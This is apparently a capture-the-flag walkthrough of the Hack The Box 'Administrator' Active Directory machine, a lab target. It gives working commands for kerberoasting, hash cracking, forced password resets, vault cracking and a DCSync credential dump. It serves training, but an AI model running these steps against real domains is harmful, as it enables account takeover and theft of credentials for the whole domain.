![Administrator](https://github.com/user-attachments/assets/258657d5-df42-4f69-aed4-223f0bc878de)

## Reconnaissance & port scanning
We start the encounter with the access to the initial user `olivia::ichliebedich`, which we will soon use to access the machine and enumerate it.

Starting with `nmap` scan:
```
# Nmap 7.94SVN scan initiated Mon Mar 10 15:02:51 2025 as: nmap -v -sV -sC --open -vvv -oA logs/initial_recon/initial 10.10.11.42
Nmap scan report for 10.10.11.42 (10.10.11.42)
Host is up, received conn-refused (0.033s latency).
Scanned at 2025-03-10 15:02:51 CET for 18s
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE       REASON  VERSION
21/tcp   open  ftp           syn-ack Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-03-10 21:04:01Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-10T21:04:04
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35406/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 35759/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 52617/udp): CLEAN (Timeout)
|   Check 4 (port 63738/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 7h01m02s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 10 15:03:09 2025 -- 1 IP address (1 host up) scanned in 18.43 seconds
```

As we can see, the box is an Active Directory instance (as it hosts fundamental AD services, such as Kerberos, LDAP etc.). Now we will proceed to the machine itself in order to enumerate the network.

### Active Directory enumeration
Let's access the machine:
```bash
evil-winrm -i 10.10.11.42 -u Olivia -p ichliebedich
```

![01_evil_winrm](https://github.com/user-attachments/assets/ac1060e0-6d23-41ca-a553-6a8fa4fa2479)


Using `evil-winrm`, we can easily upload any tool from the Kali machine using `upload` command. The tools are essential in AD encounters, as they greatly simplifies the enumeration process, if the being stealth is not a requirement.

While running the `SharpHound`, we enumerate the environment with generic Active Directory cmdlets:

Enumerating users:
```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
```

![02_user_enumeration](https://github.com/user-attachments/assets/d074b69a-8ad2-4436-9024-89b64dcf189d)

Enumerating `olivia`'s ACLs:
```powershell
foreach($line in [System.IO.File]::ReadLines("C:\Users\olivia\Documents\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'ADMINISTRATOR\\Olivia'}}
```

![03_olivia_acl](https://github.com/user-attachments/assets/0d6aa3c6-da27-4a06-8e17-72a5abac8056)

As we can see, `olivia` has `GenericAll` right over user `michael`, which can be leveraged in order to force-change his password. We can see this also in Bloodhound:

![04_olivia_bloodhound](https://github.com/user-attachments/assets/6cdcff37-199f-4329-b26a-2f7717f23efe)

Further enumeration did not returned any easy wins, which could indicate some misconfigurations or hardcoded credentials at other users directories. Let's proceed to the initial lateral movement over the network.
## Lateral movement
We can leverage many methods to gain access over `michael` user, as force-changing his password, perform targeted kerberoasting and more. As we will try to cause as little damage as possible, we will perform targeted kerberoasting.
### Targeted kerberoasting on `michael`
First we need to synchronise Kali's clock with Kerberos instance on the box:
```bash
sudo timedatectl set-ntp off && sudo rdate -n administrator.htb
```

Now we can perform the attack:
```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'olivia' -p 'ichliebedich'
```

![05_olivia_kerberoasting](https://github.com/user-attachments/assets/9c907d92-7c78-4ee6-be08-34c87be5f7d8)


The password can be easily cracked with `hashcat`:
```bash
hashcat -m 13100 michael_hash /usr/share/wordlists/rockyou.txt
```

Having access to `michael`, we can repeat enumeration and proceed to next user `benjamin`.

### Force-changing password for `benjamin`
As `michael` has `ForceChangePassword` ACE over `benjamin`, we can leverage this to force-change `benjamin` password. It is worth noted, that in real penetration test such attacks are not advised, as they can interfer with the client's AD domain (as we are changing someone password without their knowledge) and could be detected.

We will perform the attack from inside Windows machine:
```powershell
$SecPassword = ConvertTo-SecureString 'crackedPassword' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('ADMINISTRATOR\Michael', $SecPassword)
$victimPassword = ConvertTo-SecureString 'newPassword' -AsPlainText -Force

Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity Benjamin -AccountPassword $victimPassword -Credential $Cred -Verbose
```

![06_michael_force_changing_pass](https://github.com/user-attachments/assets/db9d9623-c2b5-404b-b728-ee3a87f3dd53)

Interestingly, we cannot `winrm` as the `benjamin`. This prompts, that the next step lays somewhere else.

## Enumeration and stored credentials
Further enumeration of the machine's services (such as Samba, LDAP and previously discovered FTP) returned some interesting findings on FTP server hosted on the machine:

![07_ftp](https://github.com/user-attachments/assets/fc6a6cb0-0669-4f08-b7fa-ea82b6ade71e)

The `Backup.psafe3` looks like a vault file of password manager which could be cracked. After downloading the file, we can try crack it with `hashcat`:
```bash
hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt 
```

And indeed, the vault is cracked! 

![08_vault](https://github.com/user-attachments/assets/63ca45d9-801a-426a-860a-1baf6d8a18f8)

Using `pwsafe` we can open the vault and read its contents:

![09_vault_contents](https://github.com/user-attachments/assets/2c58233f-4ffe-4aa5-9a38-81c5f7e4a773)

With this, we just gained access to three new accounts. After listing which users have home directories on the machine, we can see that `emily` could be of interest:

![10_users_homes](https://github.com/user-attachments/assets/d6cd3dce-0bc9-4f6a-a37b-06802c9254a2)

After authenticating as `emily`, we can read the first flag:

![11_user_flag](https://github.com/user-attachments/assets/9ac9afa0-67e2-4e00-bf54-5733d64e3fa8)

## Privilege escalation
### `emily` Enumeration
As we can see in Bloodhound, `emily` has `GenericAll` right over user `ethan`, which can perform DCSync attack to dump hashes of entire domain.

![12_emily_bloodhound](https://github.com/user-attachments/assets/e64022a9-3816-4ef6-8e82-d9296d3bf6ea)

![13_ethan_bloodhound](https://github.com/user-attachments/assets/05c76354-c17b-478d-91bf-835fc2e09cbb)

### Targeted kerberoasting on `ethan`
There we just repeat the steps from previous targeted kerberoasting and crack the password for `ethan`:

![14_ethan_hashcat](https://github.com/user-attachments/assets/594f7599-f1c0-4636-9f4a-01e1aabcea9b)

### DCSync attack
Knowing the `ethan` password, we can perform DCSync attack in order to dump hashes:
```bash
impacket-secretsdump -outputfile administrator.htb_hashes -just-dc ADMINISTRATOR/ethan@10.10.11.42
```

![15_dcsync](https://github.com/user-attachments/assets/4d825707-de64-4c36-88d7-ca0719f3bfb3)

This attack returns us hashes of entire domain, where for us the most valuable is the `Adminsitrator` hash and therefore, access the final root flag:

![16_administrator](https://github.com/user-attachments/assets/85ba71f2-88e8-437e-a84a-3f78dadaf292)
